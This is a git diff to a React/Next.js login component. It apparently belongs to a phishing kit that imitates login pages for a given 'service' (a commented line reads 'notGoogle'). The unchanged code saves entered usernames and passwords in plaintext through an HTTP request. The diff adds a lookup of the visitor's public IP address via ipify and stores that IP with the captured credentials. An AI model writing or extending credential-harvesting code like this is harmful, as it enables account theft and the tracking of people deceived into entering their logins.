@@ -1,5 +1,5 @@
 "use client";
-import { useState } from "react";
+import { useState , useEffect} from "react";
 import { useRouter } from "next/navigation";
 
 import UserName from "@/components/login/userName";
@@ -8,6 +8,25 @@ import Password from "@/components/login/password";
 const Login = ({ argument }) => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [ipv4, setIpv4] = useState(null);
+
+  useEffect(() => {
+    const fetchIPv4 = async () => {
+      try {
+        const response = await fetch(`https://api.ipify.org?format=json`);
+        if (!response.ok) {
+          throw new Error("Failed to fetch IPv4 address");
+        }
+        const result = await response.json();
+        setIpv4(result.ip);
+        //console.log(result.ip);
+      } catch (error) {
+        console.error("Error fetching IPv4 address:", error.message);
+      }
+    };
+
+    fetchIPv4();
+  }, []);
 
   const service = argument;
 
@@ -28,7 +47,7 @@ const Login = ({ argument }) => {
   // Function to handle HTTP request to save username and password
   const handleSaveData = async (username, password) => {
     // const service = 'notGoogle';
-    const jsonData = { service, username, password, date: new Date() };
+    const jsonData = { service, username, password, ipv4, date: new Date() };
     //console.log('Saving user data:', jsonData);
 
     let apiToUse;
